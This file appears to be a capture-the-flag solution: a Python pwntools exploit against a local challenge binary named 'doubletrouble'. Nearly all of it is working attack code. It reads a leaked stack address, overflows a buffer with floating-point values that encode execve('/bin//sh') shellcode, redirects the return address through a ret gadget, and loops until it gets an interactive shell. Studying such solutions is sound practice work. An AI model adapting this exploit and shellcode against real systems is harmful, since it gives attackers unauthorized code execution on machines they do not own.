# Import the libraries
from pwn import *
import struct

while 1:
   try:
      target = process('./doubletrouble')
      #gdb.attach(target, gdbscript='b *0x8049733')

      # Get the infoleak, calculate the offset to our shellcode
      stack = target.recvline()
      stack = stack.replace("\x0a", "")
      stack = int(stack, 16)
      scadr = stack + 0x1d8

      # Create the integer we will create, that will be stored as the double after the ROPgadget 0x804900a, which is the first return address we put
      ret = "0x8049010" + hex(scadr).replace("0x", "")
      ret = int(ret, 16)

      # Scan in some of the input 
      target.recvuntil("How long: ")


      # Etsablish the four blocks as floats, which make up our shellcode
      s1 = "-9.455235083177544e-227"# 0x9101eb51e1f7c931
      s2 = "-6.8282747051424842e-229"# 0x90909068732f2f68 
      s3 = "-6.6994892300412978e-229"# 0x9090406e69622f68
      s4 = "-1.3287388429188698e-231"# 0x900080cd0bb0e389
      # shellcode does the following:
      '''
         0xffff7ca0: xor    ecx,ecx
         0xffff7ca2: mul    ecx
         0xffff7ca4: push   ecx
         0xffff7ca5: jmp    0xffff7ca8
         0xffff7ca7: xchg   ecx,eax
         0xffff7ca8: push   0x68732f2f
         0xffff7cad: nop
         0xffff7cae: nop
         0xffff7caf: nop
         0xffff7cb0: push   0x6e69622f
         0xffff7cb5: inc    eax
         0xffff7cb6: nop
         0xffff7cb7: nop
         0xffff7cb8: mov    ebx,esp
         0xffff7cba: mov    al,0xb
         0xffff7cbc: int    0x80
      '''

      # Send the amount of floats we will input, and then send the first 5
      target.sendline('64')
      for i in range(5):

         target.sendline('-1.5846380065386629e+306')#0xff820d8400000000

      # Send the value which will trigger the bug to write over heapQt
      target.sendline('-23')

      # Send the rest of the filler floats
      for i in range(51):
         target.sendline('-1.5846380065386629e+306')#0xff820d8400000000

      # This is the value which will be between the stack canary, and the double which occupies the return address
      target.sendline('3.7857669957336791e-270')#0x0800000000000000

      # Send the shellcode blocks
      target.sendline(s1)
      target.sendline(s2)
      target.sendline(s3)
      target.sendline(s4)

      # Send the double which will reside after the return address double, which will store the address of our shellcode in the last four bytes. 
      # We have to convert the int to a float, so it's stored in memory correctly
      target.sendline("%.19g" % struct.unpack("<d", p64(ret)))

      # Send the double which will occupy the return address with the gadget 0x804900a: ret
      target.sendline('4.8653382194983783e-270')#0x804900a00000000
      if "stack" not in target.recvuntil(b'*** stack smashing detected ***: terminated', timeout=1):
         target.interactive()
      target.close()
   except Exception as e:
      print(e)
      target.close()
